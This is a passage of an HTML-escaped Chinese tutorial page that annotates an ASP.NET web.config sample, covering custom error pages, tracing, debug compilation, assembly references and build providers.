style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;error&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;statusCode&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;404&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;redirect&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;FileNotFound.htm&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;customErrors&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;配置调试和跟踪:下面配置的意思是启动调试(默认),捕获跟踪信息,要缓存的跟踪请求个数(15),跟踪结果的排列顺序&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;trace&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;enabled&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;true&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;localOnly&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;false&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;pageOutput&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;true&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;requestLimit&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;15&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;traceMode&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;SortByCategory&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;设置 compilation debug=&amp;quot;true&amp;quot; 将调试符号插入已编译的页面中。但由于这会影响性能，因此只在开发过程中将此值设置为 true。设置默认的开发语言C#。batch是否支持批处理&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;compilation&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;debug&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;true&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;defaultLanguage&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;c#&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;batch&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;false&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;assemblies&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;加的程序集引用，每添加一个程序集，就表示你的应用程序已经依赖了一个程序集，你就可以在你的应用程序中使用了&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;assembly&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Extensions, Version=1.0.61025.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;assembly&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Design, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;assembly&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Extensions.Design, Version=1.0.61025.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;assembly&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Windows.Forms, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;assembly&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;assembly&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;assembly&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Xml, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;assembly&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;assembly&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;assembly&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Services, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;assembly&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;assemblies&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;定义用于编译自定义资源文件的生成提供程序的集合。&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;buildProviders&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;!----&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;extension&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;.aspx&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Compilation.PageBuildProvider&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;extension&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;.ascx&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Compilation.UserControlBuildProvider&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;extension&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;.master&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Compilation.MasterPageBuildProvider&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;extension&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;.asmx&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Compilation.WebServiceBuildProvider&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;extension&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;.ashx&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Compilation.WebHandlerBuildProvider&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;extension&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;.soap&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Compilation.WebServiceBuildProvider&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;extension&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;.resx&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Compilation.ResXBuildProvider&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;extension&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;.resources&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Compilation.ResourcesBuildProvider&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;extension&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;.wsdl&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Compilation.WsdlBuildProvider&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;extension&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;.xsd&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Compilation.XsdBuildProvider&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span 